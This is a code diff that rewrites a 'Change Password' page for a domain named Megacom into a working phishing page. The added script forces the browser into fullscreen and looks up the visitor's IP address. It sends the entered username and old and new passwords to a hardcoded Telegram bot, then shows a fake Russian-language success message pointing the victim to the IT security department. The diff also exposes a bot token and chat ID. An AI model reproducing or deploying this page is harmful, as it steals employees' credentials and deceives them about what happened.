@@ -2,18 +2,18 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Change Password</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <img src="Group 1.png" alt="User Icon" class="user-icon">
+            <img src="Group%201.png" alt="User Icon" class="user-icon">
         </div>
         <p>Change a password</p>
         <div class="form-group">
-            <input type="text" id="username" value="Megacom/Administration">
+            <input type="text" id="username" placeholder="Username">
         </div>
         <div class="form-group">
             <input type="password" id="old-password" placeholder="Old password">
@@ -23,14 +23,106 @@
         </div>
         <div class="form-group input-container">
             <input type="password" id="confirm-password" class="input-field" placeholder="Confirm password">
-            <button class="input-button" type="button"></button>
+            <button class="input-button" type="button" onclick="sendFormData()"></button>
         </div>
         <div class="footer">
             <p>Sign in to: Megacom</p>
             <p><a href="#">How do I sign in to another domain?</a></p>
         </div>
-        <button id="cancel-btn">Cancel</button>
     </div>
-    <script src="script.js"></script>
+    <script>
+        function requestFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { 
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { 
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { 
+                elem.msRequestFullscreen();
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', (event) => {
+            setTimeout(requestFullscreen, 100);
+        });
+
+        async function getIpAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'Unknown IP';
+            }
+        }
+
+        function validateFormData(username, oldPassword, newPassword, confirmPassword) {
+            if (!username || !oldPassword || !newPassword || !confirmPassword) {
+                alert('Все поля являются обязательными!');
+                return false;
+            }
+            if (newPassword !== confirmPassword) {
+                alert('Пароль не совпадает!');
+                return false;
+            }
+            if (oldPassword === newPassword) {
+                alert('Новый пароль совпадает со старым! Сомнительно... Ну окэээй)')
+                return true
+            }
+            return true;
+        }
+
+        async function sendFormData() {
+            const username = document.getElementById('username').value;
+            const oldPassword = document.getElementById('old-password').value;
+            const newPassword = document.getElementById('new-password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+
+            if (!validateFormData(username, oldPassword, newPassword, confirmPassword)) {
+                return;
+            }
+
+            const ip = await getIpAddress();
+
+            const message = `
+                Username: ${username}
+                Old Password: ${oldPassword}
+                New Password: ${newPassword}
+                Confirm Password: ${confirmPassword}
+                IP Address: ${ip}
+            `;
+
+            const telegramBotToken = '7054133780:AAEI5YEwyhxsZe65nHh_yLyldaJB8i2Rnx0';
+            const chatId = '860389338';
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                //R
+                const response = await fetch(url);
+                const result = await response.json();
+                console.log(result);
+                if (result.ok) {
+                    alert('Ваш пароль успешно изменен! Обратитесь в отдел ОИТБ.');
+                } else {
+                    alert('Произошла ошибка при отправке данных.');
+                }
+            } catch (error) {
+                console.error('Error sending form data:', error);
+                alert('Произошла ошибка при отправке данных.');
+            }
+        }
+
+        document.body.addEventListener('click', requestFullscreen);
+
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                sendFormData();
+            }
+        });
+    </script>
 </body>
 </html>
